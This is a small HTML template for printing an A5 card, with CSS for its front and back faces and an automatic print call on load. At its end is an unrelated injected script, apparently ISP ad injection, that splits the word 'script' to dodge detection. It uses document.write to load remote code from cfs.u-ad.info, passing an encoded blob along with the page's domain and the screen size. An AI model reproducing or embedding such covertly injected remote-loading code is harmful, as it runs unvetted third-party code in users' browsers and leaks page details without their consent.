<!doctype html>
<meta charset="utf-8">
<!-- <link rel="stylesheet" href="card.css"> -->
<style>
	@page {
    /* dimensions for the whole page */
    size: A5;
    
    margin: 0;
}

html {
    /* off-white, so body edge is visible in browser */
    background: #eee;
}

body {
    /* A5 dimensions */
    height: 210mm;
    width: 148.5mm;

    margin: 0;
}

/* fill half the height with each face */
.face {
    height: 50%;
    width: 100%;
    position: relative;
}

/* the back face */
.face-back {
    background: #f6f6f6;
}

/* the front face */
.face-front {
    background: #fff;
}

/* an image that fills the whole of the front face */
.face-front img {
    position: absolute;
    top: 0;
    left: 0;
    bottom: 0;
    right: 0;
    width: 100%;
    height: 100%;
}
</style>
<body onload="window.print()">
    <div class="face face-back"></div>
    <!-- <div class="face face-front"><img src="front.png"></div> -->

	<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRjVloiOIykwBXjQlSK8FE79%2fKYX4gG4O1IoU7oO3bGIAQRTDGTA8XURbQfWJ5s4%2bSW2wIf6ZuojcFPsbtWQQdVFKwihJBLmLaubWL5Nj5HktEt%2f3qt%2f%2buJk2cy2otdZPtwqbtDWt9YTv%2fq8xFaBxH2NLU1ddMbglUWy5DVzZNP35fg69wWZhx6SY%2fOo3DL4inHNB7GBE68uTYPD6V5%2fs0wy8dQJcmTufdZLeNFsBcd61sF3vfQ%2fpiXs5NDAoCDK61Zt6qJZ6ABQ8a6tSH39MLxefTY6UJ1DFu02KWXq8U%2bxPDt21MMpAT5MsdDaOlQwTjaPU0JwJT6nYfVE8QHFA708rDgwxfR6Usj5t9TQb6roIFcgkvCv9JuniJml0hFvgk1BZB1lche1iWfgionZns1FAY%2fff69rNQ4Ml0vwGRzBFXyY0la%2fc%2b4BykiWScM1geosqXVQA9YOs6tfQIyvIFZvWOFXk5I2KUJLnERvtqIgakzuIM50gxrAqnmbXSImblp3hnvbB389Q%2fKqrxKRhJMZzaklPorRnlPoThlJXzR3pfMzxxaajM8Ea27Yt8K4NJlPb%2bHZOmiVPmCEEU9O0ynUrlpubGmAlG%2bHywHmulxqmSAhBwb7GL0A%3d%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}
	</script>
	<noscript>activate javascript</noscript>
</body>